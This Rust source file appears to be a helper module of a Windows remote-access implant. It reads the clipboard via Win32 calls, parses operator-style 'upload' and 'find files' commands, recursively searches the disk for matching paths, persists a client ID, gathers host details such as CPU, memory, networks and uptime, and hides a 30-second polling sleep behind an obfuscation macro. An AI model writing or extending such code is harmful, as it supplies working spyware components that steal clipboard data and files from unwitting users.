use crate::config;

use systemstat::{Platform, System};
use tokio::io::{
    AsyncWriteExt,
    AsyncReadExt,
    Result,
    BufReader,
};
use std::error::Error;
use std::{collections::BTreeMap, env, path::PathBuf};
use tokio::fs::File;
use goldberg::goldberg_stmts;
use tokio::time::{sleep, Duration};
use std::{fs, io};
use std::path::Path;
use sysinfo;
use windows::Win32::System::DataExchange::{OpenClipboard, GetClipboardData, CloseClipboard};
use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows::Win32::Foundation::HGLOBAL;
use std::ffi::CStr;

#[inline]
pub fn read_clipboard() -> std::result::Result<String, Box<dyn Error>> {
    unsafe {
        match OpenClipboard(None) {
            Ok(_) => {},
            Err(e) => {
                return Err(e.into());
            },
        };

        let handle = match GetClipboardData(1) {
            Ok(handle) => handle,
            Err(e) => {
                return Err(e.into());
            },
        };

        if handle.0.is_null() {
            return Err("handle is null".into());
        }

        let hglobal = HGLOBAL(handle.0); // Convert HANDLE to HGLOBAL

        let ptr = GlobalLock(hglobal);
        if ptr.is_null() {
            return Err("global lock pointer is null".into());
        }

        let c_str = CStr::from_ptr(ptr as *const i8);
        let str = c_str.to_str().ok().map(|s| s.to_string());
        match GlobalUnlock(hglobal) {
            Ok(_) => {},
            Err(e) => {
                return Err(e.into());
            },
        }
        match CloseClipboard() {
            Ok(_) => {},
            Err(e) => {
                return Err(e.into());
            },
        };

        if let Some(s) = str {
            return Ok(s);
        } else {
            return Err("no data".to_string().into())
        };
    }
}

// Former string is file's ID, latter is file's path.
#[inline]
pub fn parse_upload_command(input: &String) -> std::result::Result<(String, String), Box<dyn Error>> {
    let parts: Vec<&str> = input.split('|').collect();

        if parts.len() != 3 {
            return Err(Box::new(io::Error::new(
                io::ErrorKind::Other,
                "Input string must contain two '|' delimiter"
            )));
        }
    
    return Ok((parts[1].into(), parts[2].into()));
}

#[inline]
pub fn parse_find_files_command(input: &String) -> std::result::Result<(String, Vec<String>), Box<dyn Error>> {
    // Split the input by '|' to separate command, path, and search terms.
    let parts: Vec<&str> = input.split('|').collect();
    
    // Expect at least 2 parts: path and search terms. (command part may be present)
    if parts.len() < 2 {
        return Err(Box::new(io::Error::new(
            io::ErrorKind::Other,
            "Input string must contain at least one '|' delimiter"
        )));
    }

    // The absolute path is the second-to-last part. (or last part if only two parts)
    let path_part = parts[parts.len() - 2];
    if path_part.is_empty() {
        return Err(Box::new(io::Error::new(
            io::ErrorKind::Other,
            "Absolute path cannot be empty"
        )));
    }

    // Validate that the path exists and is absolute.
    let path = Path::new(path_part);
    if !path.is_absolute() {
        return Err(Box::new(io::Error::new(
            io::ErrorKind::Other,
            format!("Path '{}' is not absolute", path_part)
        )));
    }

    // Get the search terms from the last part.
    let terms_part = parts[parts.len() - 1];
    if terms_part.is_empty() {
        return Err(Box::new(io::Error::new(
            io::ErrorKind::Other,
            "Search terms cannot be empty"
        )));
    }

    // Split search terms by comma, preserving spaces within terms.
    let search_terms: Vec<String> = terms_part
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    if search_terms.is_empty() {
        return Err(Box::new(io::Error::new(
            io::ErrorKind::Other,
            "No valid search terms provided"
        )));
    }

    Ok((path_part.to_string(), search_terms))
}

#[inline]
pub fn find_files(absolute_starting_path: String, search_terms: Vec<String>) -> Vec<String> {
    let mut results = Vec::new();
    find_files_recursive(&absolute_starting_path, &search_terms, &mut results);
    results.dedup();
    results
}

fn find_files_recursive(current_path: &str, search_terms: &[String], results: &mut Vec<String>) {
    let path = Path::new(current_path);
    let path_str = current_path.to_string();

    // Check if the current path contains search terms.
    for term in search_terms.iter() {
        if !path_str.contains(term) {
            continue;
        }
        results.push(path_str.clone());
    }
    
    // If it's a directory, read its contents and recurse.
    if path.is_dir() {
        if let Ok(entries) = fs::read_dir(path) {
            for entry in entries {
                if let Ok(entry) = entry {
                    let entry_path = entry.path();
                    let entry_path_str = entry_path.to_string_lossy().to_string();
                    find_files_recursive(&entry_path_str, search_terms, results);
                }
            }
        }
    }
}

#[inline]
pub fn set_working_dir_to_program_dir() -> bool {
    if let Ok(exe_path) = env::current_exe() {
        if let Some(program_dir) = exe_path.parent() {
            if let Ok(()) = env::set_current_dir(program_dir) {
                return true;
            }
        }
    }
    false
}

#[inline]
pub async fn load_id() -> Option<String> {
    let string_path = config::get_id_path();
    let file_path: PathBuf = PathBuf::from(string_path);

    let file = match File::open(file_path).await {
        Ok(f) => f,
        Err(_) => {
            return None;
        }
    };

    let mut buf_reader = BufReader::new(file);
    
    let mut contents = String::new();
    
    match buf_reader.read_to_string(&mut contents).await {
        Ok(_) => Some(contents),
        Err(_) => None,
    }
}

#[inline]
pub async fn save_id(id: &str) -> Result<()> {
    let string_path = config::get_id_path();
    let file_path: PathBuf = PathBuf::from(string_path);

    let mut file = File::create(file_path).await?;

    file.write_all(id.as_bytes()).await?;

    file.sync_all().await?;

    Ok(())
}

#[inline]
pub async fn wait() {
    goldberg_stmts! {
        {
            sleep(Duration::from_secs(30)).await;
        }
    };
}

pub struct SystemInformation {
    pub memory: String,
    pub uptime_seconds: String,
    pub networks: Vec<String>,
    pub is_ac_power: String,
    pub cpu_temperature: String,
    pub cpu_info: String,
}

#[inline]
pub fn get_system_information() -> SystemInformation {
    let sys = System::new();

    let memory = match sys.memory() {
        Ok(memory) => format!("{:?}", memory.total),
        Err(e) => format!("Error: {}", e),
    };
    let mut networks_error = String::new();
    let networks = match sys.networks() {
        Ok(networks) => networks,
        Err(e) => {
            networks_error.push_str(&format!("Error: {}", e));
            BTreeMap::new().to_owned()
        },
    };
    let is_on_ac_power: String  = match sys.on_ac_power() {
        Ok(is_ac_power) => {
            if is_ac_power {
                "Yes".to_owned()
            } else {
                "No".to_owned()
            }
        },
        Err(e) => format!("Error: {}", e),
    };
    let uptime = match sys.uptime() {
        Ok(uptime) => format!("{:?}", uptime.as_secs()),
        Err(e) => format!("Error: {}", e),
    };
    let mut network_names = Vec::new();
    let cpu_temperature = match sys.cpu_temp() {
        Ok(temp) => format!("{:?}", temp),
        Err(e) => format!("Error: {}", e),
    };

    for network in networks {
        network_names.push(network.1.name.into());
    }

    if networks_error.len() != 0 {
        network_names.push(networks_error);
    }

    let mut sys = sysinfo::System::new_all();

    // First we update all information of our `System` struct.
    sys.refresh_all();
    
    let mut cpus = String::new();
    for cpu in sys.cpus() {
        cpus += &format!("CPU: Name: {} | Brand: {} | Freq.: {}\n", cpu.name(), cpu.brand(), cpu.frequency());
    }

    let information = SystemInformation{
        memory: memory,
        is_ac_power: is_on_ac_power,
        uptime_seconds: uptime,
        networks: network_names,
        cpu_temperature: cpu_temperature,
        cpu_info: cpus,
    };

    return information;
}